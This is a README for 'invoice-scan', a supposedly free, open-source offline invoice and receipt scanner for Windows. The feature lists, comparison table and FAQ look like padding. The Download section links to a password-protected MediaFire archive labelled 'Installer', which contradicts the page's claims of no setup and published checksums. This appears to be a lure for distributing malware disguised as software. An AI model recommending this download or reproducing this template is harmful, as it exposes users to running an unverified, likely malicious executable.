# invoice-scan

🧾 Free, open-source invoice and receipt scanner for Windows — fields to CSV locally, batch folders, no SaaS. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Field extraction** — vendor, date, total, tax and currency pulled from photos and PDFs locally
- ✅ **Line items table** — invoice rows captured as separate line entries, not lost in a flat summary
- ✅ **Reconciliation check** — totals verified against line items and tax math, mismatches flagged
- ✅ **Batch folders** — a quarter of receipts processed into one CSV or Excel sheet
- ✅ **Duplicate detection** — the same invoice scanned twice gets flagged instead of paid twice
- ✅ **Column mapping** — output fields renamed and ordered to match your bookkeeping import
- ✅ **100 MB self-contained exe** — runtime and OCR engines bundled, portable, offline, MIT

## Why invoice-scan

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **invoice-scan** | Dext | Manual entry | Cloud OCR APIs |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid per month | Your evenings | Paid per page |
| Open source | **Yes** | No | N/A | No
| Documents stay local | **Yes** | Upload | Yes | Upload
| Line item extraction | **Yes** | Yes | Manual | Partial
| Reconciliation flags | **Yes** | Partial | Calculator | No
| Portable, no install | **Yes, 100 MB** | Cloud | N/A | Cloud

## FAQ

**scan invoices and receipts to Excel on Windows without a subscription?**

Bookkeeping SaaS charges monthly and keeps copies of every invoice, and typing a year of receipts by hand is nobody's plan. invoice-scan extracts fields and line items locally, checks the math and exports your column layout. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark bookkeeping view (#121418, emerald #047857): receipt image left with extracted fields highlighted, results table right with vendor, date and total columns, confidence badges.
2. Reconciliation panel: total mismatch flagged in red between lines sum and printed total, diff chip reading 12.40, open source image action lit.
3. Batch results: 240 receipts with per-file status, two duplicates flagged, column mapping strip at bottom showing export order, CSV button armed.

## Download

| Source | Link |
|---|---|
| 💾 **Installer invoice-scan** | [Installer invoice-scan](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).